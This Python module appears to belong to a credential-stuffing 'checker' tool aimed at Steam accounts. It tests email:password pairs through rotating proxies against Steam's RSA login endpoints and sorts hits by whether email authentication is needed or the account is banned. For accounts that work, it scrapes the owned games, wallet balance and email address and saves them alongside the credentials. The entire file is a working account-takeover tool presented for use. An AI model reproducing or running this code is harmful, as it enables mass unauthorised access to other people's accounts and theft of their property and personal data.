from modules.variables import Checker
from modules.functions import bad_proxy, log, save, set_proxy, return_proxy
from requests import Session
import functools
from requests.adapters import HTTPAdapter, Retry
from rsa import encrypt,PublicKey
from base64 import b64encode
from urllib.parse import quote
from json import loads
from time import time
from modules.functions import get_string

def check(email:str,password:str):
    username = email.split("@")[0] if "@" in email else email
    email = email if "@" in email else "-"

    while not Checker.stopping:
        try:
            with Session() as s:
                proxy = set_proxy()
                proxy_set = set_proxy(proxy)

                s.request = functools.partial(s.request, timeout=Checker.timeout)
                s.proxies.update(proxy_set)
                retries = Retry(total=Checker.retries, backoff_factor=0.1)
                s.mount('http://', HTTPAdapter(max_retries=retries))
                s.mount('https://', HTTPAdapter(max_retries=retries))

                t_1 = int(time())
                data_1 = f"donotcache={t_1}&username={username}"
                header_1 = {
                    "Accept": "*/*" ,
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" ,
                    "Origin": "https://steamcommunity.com" ,
                    "X-Requested-With": "XMLHttpRequest" ,
                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" ,
                    "Accept-Encoding": "gzip, deflate, br" ,
                    "Accept-Language": "en-us" ,
                }
                
                
                r = s.post("https://steamcommunity.com/login/getrsakey/",data=data_1,headers=header_1)
                if "success\":true" not in r.text:
                    raise
                
                keys = r.json()
                k1 = keys["publickey_mod"]
                k2 = keys["publickey_exp"]
                t_2 = keys["timestamp"]

                encrypted_password = quote(b64encode(encrypt(password.encode(),PublicKey(int(k1,16), int(k2,16)))))
                
                data_2 = f"donotcache={t_1}&password={encrypted_password}&username={username}&twofactorcode=&emailauth=&loginfriendlyname=&captchagid=-1&captcha_text=&emailsteamid=&rsatimestamp={t_2}&remember_login=false&oauth_client_id={get_string(8).upper()}"

                header_2 = {
                    "Accept":"*/*" ,
                    "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8" ,
                    "Origin":"https://steamcommunity.com" ,
                    "X-Requested-With":"XMLHttpRequest" ,
                    "User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" ,
                    "Referer":"https://steamcommunity.com/mobilelogin?oauth_client_id=3638BFB1&oauth_scope=read_profile%20write_profile%20read_client%20write_client" ,
                    "Accept-Encoding":"gzip, deflate, br" ,
                    "Accept-Language":"en-us" ,
                }
                response = s.post("https://steamcommunity.com/login/dologin/",data=data_2,headers=header_2)
                if "\"The account name or password that you have entered is incorrect.\"," in response.text:
                    Checker.bad += 1
                    return_proxy(proxy)
                    return
                elif "\",\"emailauth_needed\":true," in response.text:
                    if not Checker.cui: log("custom",':'.join([username,password]),"Steam")
                    save("Steam","custom",Checker.time,':'.join([username,password])+f" | Email: {email}")
                    Checker.custom += 1
                    return_proxy(proxy)
                    return
                elif "\"success\":true," not in response.text:
                    raise

                cookie = response.cookies["steamLoginSecure"]
                steamid = response.json()["transfer_parameters"]["steamid"]

                header_3 = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                    "Pragma": "no-cache",
                    "Accept": "*/*"
                }
                r = s.get(f"https://steamcommunity.com/profiles/{steamid}/games/?tab=all",headers=header_3)
                if 'Your profile is being forced private due to an active Community Ban on your account.' in r.text:
                    if not Checker.cui: log("custom",":".join([username,password]),"Steam")
                    save("Steam","custom",Checker.time,":".join([username,password]))
                    Checker.custom += 1
                    return_proxy(proxy)
                    return
                games = []
                games_list = loads(r.text.replace("&quot;",'"').split("rgGames\":")[1].split(",\"rg")[0])
                for game in games_list:
                    games.append(game["name"])
                
                r = s.get("https://store.steampowered.com/account/",headers=header_3,cookies={"steamLoginSecure":cookie})
                balance = r.text.split('<div class="accountData price">')[1].split("</div>")[0]
                email = r.text.split('Email address:</span> <span class="account_data_field">')[1].split('</span>')[0]

                if not Checker.cui: log("good",':'.join([username,password]),"Steam")
                save("Steam","good",Checker.time,':'.join([username,password])+f" | Total Games: {len(games)} | Balance: {balance} | Email: {email} | Games List: [{', '.join(games)}]")
                Checker.good += 1
                return_proxy(proxy)
                return

        except:
            bad_proxy(proxy)
            return_proxy(proxy)
            Checker.errors += 1